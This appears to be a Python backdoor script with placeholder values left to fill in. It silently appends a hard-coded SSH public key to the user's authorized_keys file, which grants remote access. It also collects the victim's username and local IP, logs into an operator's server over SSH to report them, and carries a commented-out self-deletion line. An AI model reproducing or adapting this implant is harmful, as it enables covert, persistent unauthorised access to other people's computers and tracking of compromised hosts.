import socket
import os
import pwd
from pexpect import pxssh

username = "(FILL THIS)"
ip = "(FILL THIS)"
ssh_pub = ("ssh-rsa (FILL THIS) root@debian \n")

def main():
    home = os.path.expanduser("~")
    wrkdir = os.getcwd()
    os.chdir(home)

    if not os.path.exists(".ssh"):

        os.makedirs(".ssh")

    f = open(".ssh/authorized_keys", "a+")

    with open(".ssh/authorized_keys") as file:
        if ssh_pub not in file.read():
           f.write(ssh_pub)

    file.close()
    f.close()

    username=pwd.getpwuid(os.getuid())[0]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip=s.getsockname()[0]
    s.close()

    os.chdir(wrkdir)
    uploadFiles(username,ip)

def uploadFiles(username,ip):

    destination = ["IP ADDREsSS","USERNAME","PASSWORD","PORT"]
    s = pxssh.pxssh()
    s.login(destination[0],destination[1],destination[2],destination[3])
    s.sendline("touch %s_%s"%(username,ip))

main()
#subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]), shell = True)
#sys.exit(0)

